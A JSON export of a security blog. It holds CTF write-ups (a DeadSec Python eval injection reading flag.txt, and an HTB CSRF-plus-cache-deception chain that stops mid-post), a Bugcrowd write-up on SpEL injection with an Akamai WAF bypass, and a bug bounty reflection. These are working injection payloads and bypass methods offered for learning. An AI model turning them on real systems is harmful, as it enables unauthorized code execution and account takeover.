[{"body":"","link":"https://www.pmnh.site/","section":"","tags":null,"title":""},{"body":"","link":"https://www.pmnh.site/tags/ctf/","section":"tags","tags":null,"title":"ctf"},{"body":"Summary One of the things that I love about CTFs is when they provide challenges that don't require knowledge of weird language quirks or obscure exploits or (ugh) guesswork but instead just a clear head and some common sense. Kudos to the designer of the DeadSec 2023 CTF Trailblazer challenge, which offered exactly this type of problem.\nRecon The Trailblazer challenge provided exactly one page to the site and no source code was provided. Visiting the home page of the site provided the following text content:\n1[0-9 a-z A-Z / \u0026#34; \\+ , ( ) . # \\[ \\] =] Visiting any other page of the site would result in the following 404 page:\nInteresting to note that the image appearing on the page is generated from the endpoint /images/now and appears to contain a timestamp.\nOne other observation is that the server is running the (Python) waitress framework, which we can see from the server headers:\n1Server: waitress Now that we have a sense for the server and related software, let's solve this challenge!\nAnalysis The endpoint now, combined with the contents of the generated image, should be familiar to anyone who is at all familiar with the Python language, as being the default format of a datetime object, and the Python library function datetime.now can be used to return the current timestamp:\n1Python 3.8.10 (default, Mar 13 2023, 10:26:41) 2[GCC 9.4.0] on linux 3Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. 4\u0026gt;\u0026gt;\u0026gt; import datetime 5\u0026gt;\u0026gt;\u0026gt; str(datetime.datetime.now()) 6\u0026#39;2023-05-21 12:26:57.831648\u0026#39; We note that this matches what we see in the generated image. This allows us to conclude that the solution path here is a sort of RCE which will lead to us changing the contents of the image. We can easily verify this by picking some other class-level functions in the datetime class such as utcnow or today, which will generate the same image.\nLeading to a Solution So at this point we know:\nThe image is being generated by Python code probably eval'ed from a string like this: datetime.**last-path-segment**() Certain characters are not allowed in the path segment (we assume this from the list of characters shown on the home page) Our goal is to read the content of flag.txt (this was later provided as a hint although I solved the challenge prior to this hint being available) Let's see if we can chain a simple method call first, since the injection point ends with parens we know that the last part of our injection has to be a function that takes no parameters. So the following works:\n1/images/now().toordinal This results in an image with the following content 738861. So we've confirmed we can chain function calls as we had hoped, and the contents of the image will reflect the return value of the last function call (toordinal is a function on a datetime object as documented here).\nIf you don't want further spoilers, you can safely stop here and try to build the exploit chain yourself üòÅ\nReading a File Finally, I had to come up with a way to read the content of the flag file and ensure the contents of the file fed into the method chain, since we can't inject carriage returns and other control structures due to the character set limitations. Also, we can't use a typical __globals__ type injection because the _ character is prohibited.\nThe path I took was to inject a Python lambda function, which allows for arbitrary / simple inline code to be used to process typically an iterator such as an array or string. Typically these are used to perform some sort of processing on the input i.e. a transformation, but in this case we're just using it as a vehicle to inject arbitrary code.\nLambda functions can be used in many Python library functions, but map seemed like a logcal choice. Since map requires an iterable parameter, and we are starting from a datetime object, I decided to figure out how to get a string from the datetime and then pass the string to the map function. I built up the payload like so:\n1/images/now().strftime(%22aaa%22).title --\u0026gt; AAA Remember we still have to end the injection with a parameterless function invocation, there are many on string. strftime on the datetime class was useful because it allows us to provide any arbitrary string as output. We pass this lambda result to strftime to get the string value added into the method chain. We iterate on a dummy array [1] so that the lambda function is executed exactly once:\n1/images/now().strftime(str(map(lambda a: a, [1]))).title --\u0026gt; \u0026#39;\u0026lt;Map Object At 0X7Fd1789Fd9A0\u0026gt;\u0026#39; Oops! From this we can see our basic premise works, but we need to convert the map object (with a single element) to a printable string so we can see the result in the image output, we do this by wrapping it with the str(list(...)) built-in functions:\n1/images/now().strftime(str(list(map(lambda a: a, [1])))).title --\u0026gt; \u0026#39;[1]` Now we simply put an open('flag.txt').read(100) in the lambda and we should have our flag:\n1/images/now().strftime(str(list(map(lambda a: open(\u0026#34;flag.txt\u0026#34;).read(100), [1])))).title And we see the flag is (partially) revealed!\nFurther work was required to see the whole flag, this was made a little more painful because the font used in the image did not clearly indicate uppercase and lowercase letters. We'll leave this as an exercise to the reader, try reproducing this in your local Python CLI and see how you might iterate through the characters üòÑ\nOverall a super fun challenge that required no brute force or guesswork but just putting the pieces together. Thanks DeadSec!\n","link":"https://www.pmnh.site/post/ctf-deadsec-2023-trailblazer/","section":"post","tags":["ctf","python","rce"],"title":"CTF Writeup: 2023 DeadSec CTF: Trailblazer"},{"body":"","link":"https://www.pmnh.site/post/","section":"post","tags":["index"],"title":"Posts"},{"body":"","link":"https://www.pmnh.site/tags/python/","section":"tags","tags":null,"title":"python"},{"body":"","link":"https://www.pmnh.site/tags/rce/","section":"tags","tags":null,"title":"rce"},{"body":"","link":"https://www.pmnh.site/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"Summary This writeup talks about a successful collab that I did with Dark9T (@UsmanMansha) on a private program hosted on Bugcrowd. We ended up able to bypass Akamai WAF and achieve Remote Code Execution (P1) using Spring Expression Language injection on an application running Spring Boot. This was the 2nd RCE via SSTI we found on this program, after the 1st one, the program implemented a WAF which we were able to bypass in a different part of the application. Read on to find out how we did it!\nIntro Usman reached out to me on a Slack server where we are both members. They had found a potential SSTI but were not able to exploit it due to an Akamai WAF:\nAfter a quick look, this seemed to be a case of the famous Spring Boot Error page issue described on Github here - note that there was never a CVE issued for this as far as I am aware. This vulnerability has been covered in various forms for example by 0xdeadpoool on their blog here.\nThe basic principle of this bug is that the vulnerable version of Spring Boot will render the error message from the thrown Exception into the page itself using an SpEL (Spring Expression Language) expression. The vulnerable version of the Spring Boot framework will allow recursive evaluation of this expression, thus an error message which contains a valid SpEL expression (e.g. $(7*7)) would be evaluated at the the time the error page is rendered.\nIn this case we could see the q parameter of the vulnerable URL supported injection of the type ${x*y} and returned a mathematical result in the error text:\nSteps with RCE via SpEL If you haven't had experience with this type of vulnerable application before, I'd strongly suggest some practice using an application such as https://github.com/jzheaux/spel-injection where you can experiment with how SpEL is constructed and handled (and potentially secured) within Spring applications. While this application doesn't deal directly with this specific vulnerability, SpEL is used so often in the Spring Ecosystem it's worth some practice and familiarity with the code.\nThis blog won't introduce you to Spring Expression Language as the topic is quite complex, essentially it's a language which allows context-based navigation of Spring objects, similar to other server-side templating languages. It's used many places in various Spring Framework components and the exact extent of objects and data available depends a lot on where it's used. Typically you can execute Java methods, construct objects, etc. - not as powerfully as FreeMarker or Velocity, but similar in risk profile. You can read about SpEL and its syntax in the Spring reference documentation.\nGenerally the goal with SpEL is to end up with an invocation of the methods java.lang.Runtime.exec or java.lang.ProcessBuilder.start which will allow execution of an OS command of the attacker's choosing, using an expression something like the following:\n1${T(java.lang.Runtime).getRuntime().exec(\u0026#34;\u0026lt;my command here\u0026gt;\u0026#34;)} If you want the output of the command, the expression gets a bit more complex, but let's start here.\nA Quick Note - Time / Effort Spent Folks who know me know that I am primarily a manual tester, relying on my extensive development/architecture experience rather than brute force to find tough bugs. Although reading a blog post may make it appear that a bug was obvious or a particular path was obvious, just to give some statistics, getting from the initial Slack message from Usman to full RCE took me:\nApproximately 500 hand-crafted attempts to bypass the WAF Approximately 14 hours of wall clock time from the initial attempt to the first successful RCE (execution of the uname -a command) - note that I took breaks to eat, take a walk, think about solutions etc. - it wasn't 14 hours straight! I'm including these because it's often the case that blog posts make this kind of bug \u0026quot;seem\u0026quot; a lot easier than it actually is, leading readers down the dark path of impostor syndrome etc., just reinforcing that even if you know what you're doing, sometimes bugs are really tough! Don't give up! üòÑ\nStep 1 - Try the Obvious First off we had to determine how to reach the java.lang.Runtime class, so that we could get an instance of it, on which to invoke the exec method. We tried the most obvious ${T(java.lang.Runtime)} - which is SpEL shorthand for referencing a Java class by name, and of course it was blocked by the Akamai WAF:\nSince Akamai WAF was in the way, I suspected this would not work, but when trying to work around a WAF it's really important to build up from small things that you know work, to larger and more complex payloads. This is true for RCE, SQLi, XSS, or any complex payload when trying to avoid WAF rules, very often WAFs are coded to recognize obvious payloads but (as we will see) can't figure out complex payloads.\nStep 2 - Figure out how to get an arbitrary Class Typically the next stage of a Java-based code injection vulnerability is to figure out how to get a reference to an arbitrary Class, from which we can use direct method invocation or reflection-based invocation to get at the method we want.\nThe easiest method is to do something like the following (which worked in this case):\n1${2.class} Response:\n1class java.lang.Integer This is a good sign, we know we can access the java.lang.Integer Class object (if you need a refresher [https://stackoverflow.com/questions/1215881/the-difference-between-classes-objects-and-instances](this SO answer is a good start)), and from here we should be able to get to the forName method to instantiate an arbitrary class. Let's try it!\n1${2.class.forName(\u0026#34;java.lang.String\u0026#34;)} Response:\n1\u0026lt;H1\u0026gt;Access Denied\u0026lt;/H1\u0026gt; 2 3You don\u0026#39;t have permission to access ... As expected, the obvious payload using the forName method with a string did not work and was easily detected by the Akamai WAF. In the next round of exploration I was able to determine that some sort of transformation was being applied to both single and double quotes that caused expressions using either of these characters to be malformed. Thus even if we could reach the Class.forName method, we wouldn't be able to take the straightforward route of something like ${2.class.forName(\u0026quot;java.lang.Runtime\u0026quot;)...} but instead need to find some other way to construct the name of the Class to be instantiated.\nStep 3 - Figure out how to get an arbitrary String I knew that being able to build an arbitrary string would be required to achieve the full RCE for multiple reasons:\nName of class to be instantiated or referenced Name of method (most likely .exec() is also blocked by the WAF) Command to be executed Keep in mind that I can't use quote characters of either type, so straightforward string concatenation is not possible in this circumstance. I needed to find a way to get from an integer value (ASCII or hex) to a character, and then concatenate characters to form a String.\nI've run into this situation a number of times, either solo or in collabs and I always refer back to the Java API Documentation which has so much useful information about available methods and classes, although I know many of the core Java classes by heart, it's often been the case that I find some hidden gem that will do exactly what I need!\nA few obvious choices in the Java standard library:\njava.lang.String constructor, taking a byte array (as inspired by mykong and Bealdung) java.lang.Character.toString method, described in Javadoc After some experimentation I determined that it was basically not possible to invoke any constructor, because both methods of invoking a constructor in SpEL, either new, T(), or through reflection and newInstance was also blocked by the WAF.\nSo it seemed like the java.lang.Character.toString method was the way to go, only one problem...\nStep 4 - Figure out how to get a reference to a java.lang.Character class Since java.lang.Character.toString is a static method on the java.lang.Character class, I simply needed a reference to an object of this type to be able to reach the method. Because SpEL is dynamic, I don't believe it supports casting as you could in static Java code, e.g. (char)99 - and unfortunately java.lang.Class was blocked by the WAF so I couldn't use the java.lang.Class.cast method.\nSo I ended up with the following chain:\nFigure out how to get a reference to a String object Call the java.lang.String.charAt method on that object (which returns a java.lang.Character) Invoke the toString static method on this character - since it's a static method it doesn't matter what the value of the Character is Thus I finally had my gadget required to build an arbitrary String:\n1${(2.toString()+2).charAt(0).class.toString(99)} Response\n1c Note that 99 is the ASCII value for the character c. Success!\nSince the + character was allowed through the WAF and in this context I was able to now build strings using this method of individual character concatenation.\nStep 5 - Build attack payload So, now we have one ingredient we need - building arbitrary String - we need one more, which is a way to invoke the java.lang.Runtime.exec method. I ended up using a technique similar to the one described here, basically the following:\nUse reflection to get access to the Class.forName method Build a String with the value java.lang.Runtime to pass to forName Use reflection to get access to the java.lang.Runtime.getRuntime method (required to get an instance of the class to invoke a method) Build a String with the value exec and/or use reflection to find the exec method of the java.lang.Runtime class Build a String with the RCE payload value to pass to the exec method In this phase of the exploitation, I spent a lot of time iterating over the output from various reflection calls. This is especially important because different JVMs will return different values, particularly when you are using the java.lang.Class.getMethods reflection technique.\nDon't invoke reflected methods blindly! There are dangerous methods on java.lang.Runtime such as shutdown which will immediately terminate the JVM!\nStep 6 - (Time Wasted) Trying to work around GET length restrictions At this point I realized that for some payloads I would end up with a really long payload if I'm constructing a long RCE command e.g. an nslookup or similar. My payload for a single character c was 45 bytes long (${(2.toString()+2).charAt(0).class.toString(99)})!\nWith a GET request maximum length enforced by some browsers and/or servers at approximately ~2kb this meant the longest String I could build might be only about 45 characters long - a big problem!\nAt this point I ended up going down a bit of a chase to figure out how to more efficiently create a String from a list of bytes. I tried a bunch of things and almost had one working using the neat collection projection feature of SpEL, but unfortunately I was blocked by a Spring bug in the version this target was running. Ultimately I couldn't find any more efficient method of building the String character by character.\nIn this sense I ended up getting lucky, the server accepted a GET request longer than 2kb (final payload was just under 3kb), and typically you are safe before 4kb on most servers.\nStep 7 - Assembling the final payload At this point after Step 5 I basically had all the pieces I needed to build the final payload, which was essentially a translation of the following payload:\n1org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(\u0026#34;uname -a\u0026#34;).getInputStream()) I'm not going to supply the payload in text form because I don't want someone blindly copy-pasting into a context where it likely won't work anyway, but hopefully this post gave you the methodology to build your own payload to bypass a WAF and server-side restrictions.\nFinal Thoughts I find WAF bypasses on critical vulnerabilities such as RCE and SQL Injection some of the most fun bugs to work on. Of course the rewards are good, but these sort of bugs really require deep knowledge of why a particular bug works, and the context in which it executes.\nIn this case, deep knowledge of Java and SpEL capabilities was required to construct a payload that would both bypass the Akamai WAF as well as work in the context where it was executing.\nI hope you enjoyed this writeup. If you encounter this type of injection and you need help bypassing a WAF, feel free to DM me on Twitter and I'm always happy to collab if you have a confirmed injection but can't escalate it.\n","link":"https://www.pmnh.site/post/writeup_spring_el_waf_bypass/","section":"post","tags":["writeup","rce","bugcrowd","waf"],"title":"Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass"},{"body":"","link":"https://www.pmnh.site/tags/bugcrowd/","section":"tags","tags":null,"title":"bugcrowd"},{"body":"","link":"https://www.pmnh.site/tags/waf/","section":"tags","tags":null,"title":"waf"},{"body":"","link":"https://www.pmnh.site/tags/writeup/","section":"tags","tags":null,"title":"writeup"},{"body":"","link":"https://www.pmnh.site/tags/learning/","section":"tags","tags":null,"title":"learning"},{"body":"In September 2022, I celebrated 2 years doing bug bounty as the anniversary of my first paid bounty on HackerOne passed. I thought it might be useful to write up some of the lessons learned and some tips and tricks that might help new hunters (things I wish I knew when I started). Bug bounty has been an incredible benefit in my life. It's allowed me the opportunity to achieve a lifestyle of continuous learning as well as transition to a full-time bug bounty career!\nA Quick Disclaimer There is a ton of great \u0026quot;getting started\u0026quot; information on the internet. Content creators such as Katie, Ben, Jason, have put together wonderful material. I'd suggest starting with these resources first and use this guide after your first month or two of getting started.\nAlso, keep in mind my hunting is 99% manual - I don't invest heavily in subdomain discovery, brute force scanning, etc. - so if that's your hunting style, you may not get much out of this post.\nMy First Bounty - 2020 Sep I started bug bounty in approximately July/Aug 2020 on HackerOne as a fun COVID hobby and a break from my full-time job in software development. I had signed up for a HackerOne account and done some of the CTFs several years earlier but really hadn't paid much attention to the bug bounty scene.\nWhen I first started bug bounty, my tools looked like:\nFiddler Proxy Google Docs (for taking notes) That's it! In fact, I literally did not change this tool set for the first 2-3 months of bug bounty, at which point I started to learn Burp Suite Community Edition.\nMy first bounty was on a private program (now public) which I earned an invite to from solving some of the H1 CTF challenges. The bug related to email enumeration through error message differentiation. Let's be clear: this is a terrible bug which is not accepted by most programs üòÑ I was enormously lucky (and later, enormously grateful) to the program for accepting the bug and paying me a massive $500 bounty (the only time you will hear me talk about earnings).\nWhen I was paid I was absolutely shocked - how could this be possible? I am doing what I love and companies are paying me to tell them about vulnerabilities like this!\nFrom starting bug bounty to first paid bounty took over 2 months - don't worry if it takes a while!\nLessons Learned from this early phase:\nTools matter a lot less than you think. Focus on a small set of bug types and get good at recognizing them. Don't give up and don't pay attention to others' achievements. Say \u0026quot;thank you\u0026quot; when a program pays you, no matter what the amount. Don't ask a program for updates before 1-2 months has passed (I regret that I asked this program for an update after 21 days). My Second Accepted Bug - 2020 Oct So it took over a month to get my next bug (not paid because the site was not part of the paid scope for the program). I made several (failed) attempts to submit additional bugs to that same private program (some duplicate, some invalid) and learned a lot about what really matters when hunting for bugs.\nIf you have to ask - is this a bug? - it is almost certainly not a bug.\nMy next bug was a persistent XSS in a public program with a fairly large scope and relatively low bounties. When dealing with a larger scope program I started to learn a little bit about better practices in terms of taking notes and simple tools for automation. My tools now looked like:\nFiddler Proxy VS Code (notes in Markdown) Subfinder for subdomain enumeration (the program I was working has a wildcard scope) A few hard lessons learned during this time about things that are not bugs (in most programs - there are always exceptions):\nUnrestricted upload to S3 bucket is almost always uninteresting to programs (unless the buckets are used to serve content in an interesting domain). Client-side bypasses without corresponding server-side bypasses are not really bugs. IDORs with a non-guessable key (UUID, complex identifier) and without an oracle are not reportable. Although each of these rejections was frustrating, it was a great way to learn what is reportable and to reinforce the rule above \u0026quot;if it doesn't seem like a bug, it's probably not\u0026quot;.\nNext Bounties and Catching my Rhythm By the end of Oct 2020, I had my 2nd paid bounty (IDOR) and I was starting to get some confidence. Keep in mind this is about 4 months since I started - it takes time to build confidence and know what you're looking for, especially at the beginning and especially on programs that have been well-hunted!\nIn Nov 2020 I received my first critical bounty (another IDOR) and at this point I was absolutely hooked on bug bounty as a hobby and a great way to challenge myself to continue to learn. I didn't change my toolset or methodology for another month, finally adopting Burp CE in Dec 2020, and then using my bounties to purchase a Burp Pro license in Jan 2021 (got tired of losing all my work and/or leaving Burp CE open for weeks at a time üòâ\nFor the first 4+ months of my bug bounty journey I did not own a Burp Pro license. I bought one once I earned more than enough to pay for it.\nSome final tips for the \u0026quot;getting started\u0026quot; part of my journey:\nStart with types of bugs that you understand based on your experience level. IDORs are usually very easy to explain and understand, as well as hunt for, even if you don't have a technical background. Understand how a browser works and the basics of HTML and Javascript if you are going to be hunting web type bugs (XSS in particular), otherwise you will get frustrated blindly copy/pasting payloads. Understand the purpose of VDPs and consider avoiding them. I know this is controversial. VDPs can be a great way for new people to find vulns in the real world, but also can give hunters a false sense of confidence. Make no mistake - paid programs are much harder than VDPs because there is a financial incentive for people to hunt them. Don't worry about points. They don't really matter. Learn the art of patience and respect with programs. Don't give bug bounty a bad reputation by trying to bully, swear, or behave unprofessionally. Hunt a program you're interested in. Nothing is worse than trying to stay motivated on a program that you don't understand or don't care about securing. Don't measure yourself against what you see on Twitter. Everyone is on their own journey. I didn't read bug bounty Twitter for at least a year after I started hunting. Stats Since I know people love stats - I'll share a few highlights here from my past 2 years and plan to do a follow-up post if there's interest. Note that some of these stats are a little hard to get automatically so they may be slightly fuzzy.\nI've included only accepted, non-duplicate bugs in the stats below, my duplicate rate is about 10-15% depending on the platform and program.\nPlatform Accepted Bug Total Crit / P1 (9-10) High / P2 (7-9) HackerOne 191 20 54 Bugcrowd 30 9 6 Synack 259 51 63 My top bug types in the P1/P2 range are:\nRCE SQLi Access Control / Authentication Bypass IDOR Definitely in recent times I focus more on these complex / deep bug types, I find them fun and challenging to discover as well as impactful for the affected companies.\nNote that few if any of these include findings on VDPs although the HackerOne stats include pen tests because it's not currently possible to filter out pen tests on that platform.\nWrap-Up Hopefully this was an interesting read about the start of my bug bounty journey and gives you a little insight into how to go from the very basics (many rejected bugs, no clue what a valid bug looks like or how to find it) to a successful bug bounty career.\nFor me - the programs that I've made the most money on HackerOne have all been public programs.\nA few closing thoughts:\nDon't focus on finding that magic private program. Although private programs which have been very lightly tested exist, they are very very rare on the major platforms. Don't let money be the motivator for bug bounty. I know this is probably controversial and of course bug bounty has made a huge difference in peoples' lives across the world - however if money is your primary motivator it will add stress, disappointment, and anxiety that will absolutely not help you focus. Consider bug bounty an amazing hobby that happens to pay money once you know what you're doing, and leave it that way for a while - maybe forever. Don't feel you need to understand every type of bug to be successful. Honestly, there are a bunch of types of bugs I've read about that I never look for (HTTP Response Splitting - I'm looking at you üëÄ). To me, the effort to get up to speed on these types of bugs is not worth the investment when I can instead get better at the bugs I already know. Don't stop learning. Challenge yourself! As soon as a hobby gets boring or repetitive, it's now become work. Try something new, pick up a challenging program that you think might be impossible. You will be surprised! Don't focus so much on using the newest fancy tool that you miss out understanding what it does or why it works. I can't tell you the number of people who can't answer a basic question about how an HTTP request works, or why an XSS payload works, who have 30+ tools they use for their hunting. Start with the basics, get a solid understanding, then automate to gain efficiency. Thank the people who built the tools you use - especially if you're using open source tools. There are real people behind all these amazing tools we can use for (mostly) free. If they help you, send a nice note to the author - it really means a lot! Thank you for your time in reading this, please send along any comments, my Twitter DM is open for good questions and meaningful feedback.\n","link":"https://www.pmnh.site/post/2022-sep-2-years-bug-bounty/","section":"post","tags":["learning"],"title":"Reflecting on 2 Years of Bug Bounty"},{"body":"","link":"https://www.pmnh.site/tags/csrf/","section":"tags","tags":null,"title":"csrf"},{"body":"Summary Genesis Wallet was one of the harder web challenges in the 2022 Hack the Box (HTB) CTF. Our team composed of Synack Red Team members finished a respectable 21st place, unfortunately we were very close to solving this challenge and literally were about 5 minutes from a successful solve when time expired - so sad!\nPersonally I thought this was a very clever challenge and probably one of the best designed web challenges in any CTF I've done to date, so I thought I'd share it with interested readers.\nSetup You are presented with the Genesis Wallet system, an online site that is used to transfer GTC tokens from one wallet address to another. You are provided with a set of credentials (username icarus and corresponding password) for a wallet and can log in using these credentials - BUT the site is protected by 2FA and requires you to also have an OTP code to log in.\nAs with the other HTB CTF challenges, we're provided with the full code of the application, which makes finding the path to the flag slightly easier.\nApplication Architecture This application is a NodeJS application running in a Docker container. It is fronted by a Varnish proxy server and has a SQLite database behind it.\nFinding the Flag With many of the white box challenges in this CTF, it is fairly easy to locate where the flag is available - the challenge is getting to it in the running web application!\nIn this case we can look at the routes/index.js file and see that the flag is displayed on the main application dashboard under certain conditions:\n1router.get(/^\\/(\\w{2})?\\/?dashboard/, AuthMiddleware, async (req, res) =\u0026gt; { 2\tlet lang = req.params[0]; 3\tif (!lang) lang = \u0026#39;en\u0026#39;; 4 5\treturn db.getUser(req.user.username) 6\t.then(user =\u0026gt; { 7\tlet flag = null; 8\tif (user.balance \u0026gt; 1337 \u0026amp;\u0026amp; user.username != \u0026#39;icarus\u0026#39;) flag = fs.readFileSync(\u0026#39;/flag.txt\u0026#39;).toString(); 9\tres.render(`${lang}/dashboard.html`, { user, flag }); So we can see that in order to display the flag we need to satisfy the following conditions:\nNeed to have a wallet balance which is substantial (\u0026gt;1337 GTC) Need to be logged in as a user who is not icarus (the credentials we are provided with the challenge) Initial Setup - New Account The site supports self registration functionality that proceeds as follows:\nRegister new username / password Log in with username / password Register 2FA QR code with authenticator Confirm OTP from authenticator When we create a new account, we discover that new users are granted 0.1 GTC free into their wallet. Based on the market cap of the GTC token this is very generous ;)\nIf we need to reach a balance greater than 1337 GTC this will require a lot of accounts and a lot of consolidation of \u0026quot;free\u0026quot; GTC tokens. There must be a way to get more tokens into an account we control!\nFinding the Tokens Let's look at how the database is seeded, maybe this will help us find a wallet with a balance? In database.js, which is used at startup of the NodeJS applcation to seed the database, we see the following:\n1\tasync migrate() { 2\tlet uOTPKey = OTPHelper.genSecret(); 3\tlet uAddress = crypto.createHash(\u0026#39;md5\u0026#39;).update(\u0026#39;icarus\u0026#39;).digest(\u0026#34;hex\u0026#34;); 4\treturn this.db.exec(` 5\tDROP TABLE IF EXISTS users; 6\tCREATE TABLE users ( 7\tid INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, 8\tusername VARCHAR(255) NOT NULL UNIQUE, 9\tpassword VARCHAR(255) NOT NULL, 10\tbalance DOUBLE DEFAULT 0.100, 11\totpkey VARCHAR(255) NULL, 12\taddress VARCHAR(36) NOT NULL UNIQUE 13\t); 14 15\tINSERT OR IGNORE INTO users (username, password, balance, otpkey, address) 16\tVALUES (\u0026#39;icarus\u0026#39;, \u0026#39;FlyHighToTheSky\u0026#39;, 1337.10, \u0026#39;${uOTPKey}\u0026#39;, \u0026#39;${uAddress}\u0026#39;); So we see that the user icarus has a wallet balance that is seeded with a little more GTC tokens than we need to satisfy the first flag criteria. To satisfy the second criteria, we need that balance to be in a wallet which is not controlled by the user icarus - so how can we manage a transfer of funds to our wallet?\nSteps to Transfer Funds After experimenting with the functionality of the site, we learn the flow to send funds from one wallet to another is as follows:\nSender intiates a transaction The transaction includes the receiver's wallet address and amount The transaction may include a note, specified in Markdown Sender confirms the transaction with their OTP Receiver can see the transaction on their dashboard and the funds are added to their wallet The transaction note specified in Markdown seems interesting, and I immediately thought that this could be an easy CSRF via XSS (a theme very common in web CTF challenges), however in this case we face the dreaded DOMPurify as can be seen in the NodeJS function responsible for converting the Markdown to HTML for rendering (located in helpers/MDHelper.js):\n1const showdown = require(\u0026#39;showdown\u0026#39;) 2const createDOMPurify = require(\u0026#39;dompurify\u0026#39;); 3const { JSDOM } = require(\u0026#39;jsdom\u0026#39;); 4 5const conv = new showdown.Converter({ 6\tcompleteHTMLDocument: false, 7 [...snip...] 8}); 9const makeHtml = (md) =\u0026gt; { 10 return(conv.makeHtml(md)); 11} 12const filterHTML = (content) =\u0026gt; { 13 html = makeHtml(content); 14 window = new JSDOM(\u0026#39;\u0026#39;).window; 15 DOMPurify = createDOMPurify(window); 16 return DOMPurify.sanitize(html, {ALLOWED_TAGS: [\u0026#39;strong\u0026#39;, \u0026#39;em\u0026#39;, \u0026#39;img\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;ul\u0026#39;, \u0026#39;ol\u0026#39;, \u0026#39;li\u0026#39;]}); 17} So we see that the showdown converter is used to convert Markdown to HTML, and the result is run through DOMPurify with a very restricted list of supported tags. I hoped that there was some trick here where an older / vulnerable version of DOMPurify was in use (we've seen this in several CTFs recently) but unfortunately this was not the case.\nFraming the Solution: CSRF via \u0026lt;img\u0026gt; tag After thinking about this for a bit, I realized that we had the potential to submit an \u0026lt;img\u0026gt; tag with an src= attribute that could invoke a GET-based CSRF attack, when the receiver (icarus) views the transaction.\nSide Quest: Finding icarus's Wallet Before I could test this theory, I had to solve the practical problem of not knowing what the wallet address for icarus was. Fortunately this was easily determined by running the code in the database seeding script in the Node CLI:\n1$ node 2\u0026gt; crypto.createHash(\u0026#39;md5\u0026#39;).update(\u0026#39;icarus\u0026#39;).digest(\u0026#34;hex\u0026#34;); 3\u0026#39;1ea8b3ac0640e44c27b3cb8a258a87f8\u0026#39; Next Steps: Finding a CSRF Fortunately there were not too many routes in this Node application, and I knew I had to find something that was GET-based and 2FA-related. After some code review I came upon the code to handle the initial setup (or resetting) of a user's 2FA authenticator application:\n1router.get(/^\\/(\\w{2})?\\/?(setup|reset)-2fa/, AuthMiddleware, async (req, res) =\u0026gt; { 2\tlet lang = req.params[0]; 3\tif (!lang) lang = \u0026#39;en\u0026#39;; 4\tlet otpkey = OTPHelper.genSecret(); 5 6\treturn db.setOTPKey(req.user.username, otpkey) 7\t.then(() =\u0026gt; { 8\treturn res.render(`${lang}/setup-2fa.html`, {otpkey: otpkey, action: req.params[1]}); We can see that, when invoked, this URL will generate a new OTP key for the currently logged-in user, save it to the database, and then display the key to them in their browser. Can you spot the critical bug here?\nThat's right - the new OTP key is saved to the database before being confirmed by the user. This is a pretty bad design because if the user doesn't confirm that they have scanned the QR into their authenticator app, they could be permanently locked out of their account (having reset the OTP without actually confirming that they have it!).\nSo, in theory this means that we can send a transaction note with the following HTML content to trigger generation of a new OTP key for the user receiving our transaction:\n1\u0026lt;img src=\u0026#34;/reset-2fa\u0026#34;\u0026gt; Of course we need to convert this into Markdown for use in the note:\n1![](/reset-2fa) We have a big problem though - how does this help in our quest to steal funds from icarus's wallet?\nExplainer: OTP Keys and 2FA via TOTP As a very brief explanation of what OTP keys are - most TOTP solutions rely on the creation of a shared secret, which is known by the server and the client. They use the same algorithm, seeded with this secret, to generate (client) and confirm (server) that the time-based codes are correct.\nKnowledge of this secret can lead to an attacker being able to generate their own TOTP codes which are guaranteed to be in sync with any other client as well as the server. This is well explained in the Wikipedia Article on TOTP codes.\nConfirming the CSRF As a quick confirmation, we created a transaction and sent it to the icarus wallet address containing an image that pointed to Burp Collaborator. We confirmed that shortly after the transaction was confirmed by the sender, the \u0026lt;img\u0026gt; tag was hit. Examining the code of the application, in bot.js we can see that there is code to log into the application and view the \u0026quot;transactions\u0026quot; page after every confirmed transaction:\n1const viewTransactions = async () =\u0026gt; { 2 try { 3\tconst browser = await puppeteer.launch(browser_options); 4\tlet context = await browser.createIncognitoBrowserContext(); 5\tlet page = await context.newPage(); 6 7\tlet token = await JWTHelper.sign({ username: \u0026#39;icarus\u0026#39;, otpkey: true, verified: true }); 8\tawait page.setCookie({ 9\tname: \u0026#34;session\u0026#34;, 10\t\u0026#39;value\u0026#39;: token, 11\tdomain: \u0026#34;127.0.0.1\u0026#34; 12\t}); 13\tawait page.goto(\u0026#39;http://127.0.0.1/transactions\u0026#39;, { 14\twaitUntil: \u0026#39;networkidle2\u0026#39;, So it seems we are onto something with this CSRF idea since there is clearly a headless browser that is intended to view the transaction note.\nThe Final Puzzle Piece - Grabbing the OTP secret This last piece actually took me a while to think through - we need to be able to view the content of the /reset-2fa page after it has been requested by icarus from our CSRF attack. How would we do this?\nFor anyone who plays CTFs regularly you know that usually \u0026quot;things are there for a reason\u0026quot; is an axiom you can follow if you get stuck for ideas. It occurred to me to look at the Varnish proxy configuration and then the final piece of the puzzle became clear. Let's look at config/cache.vcl, which is the Varnish Cache configuation file, written in VCL, the Varnish language. Particularly, this piece stood out to me:\n1sub vcl_recv { 2 # Only allow caching for GET and HEAD requests 3 if (req.method != \u0026#34;GET\u0026#34; \u0026amp;\u0026amp; req.method != \u0026#34;HEAD\u0026#34;) { 4 return (pass); 5 } 6 # get javascript and css from cache 7 if (req.url ~ \u0026#34;(\\.(js|css|map)$|\\.(js|css)\\?version|\\.(js|css)\\?t)\u0026#34;) { 8 return (hash); 9 } 10 # get images from cache 11 if (req.url ~ \u0026#34;\\.(svg|ico|jpg|jpeg|gif|png)$\u0026#34;) { 12 return (hash); 13 } We can see that Varnish is configured to cache any URL matching these regexes for static content. Crucially, it's important to note that the req.url value is the full URL of the request and not just the portion before any query string. This means that the following URL will be cached by Varnish:\n1/reset-2fa?ctf.jpg This was the final piece of the puzzle that was needed to grab the OTP secret. Basically, by adding a query string value that will trigger the Varnish caching of the page content, any other request to that same URL should return the same content until the Varnish cache TTL (in this case set to 2 minutes) expires. This should allow us to view the contents of the cached page which was rendered to icarus when the CSRF request took place!\nThis was a brilliant use of reverse cache poisoning, where we are forcing sensitive data to be cached such that an attacker can read it. Truly a brilliant design choice for this challenge!\nAssembling the Final Payload We now have all the steps requires to complete the 